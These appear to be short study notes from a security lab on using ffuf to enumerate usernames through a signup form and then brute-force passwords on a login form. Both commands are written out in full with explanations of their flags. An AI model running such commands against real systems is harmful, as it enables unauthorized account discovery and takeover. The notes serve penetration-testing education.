- can be used to bruteforce usernames
Ex: 
```shell-session
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```
- -w: specify word list
- -X: specify HTTP method
- -u: specify url
	- use of `FUZZ` to specify where the usernames must be added in the request
- -mr: text we are looking for on the page to know we have found a user

- can be used to perform password bruteforce attacks:
Ex: 
```shell-session
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```
- use of `W1` and `W2` to specify where the usernames and passwords must be added in the URL, see patern on -w
- -fc used to know we have a match
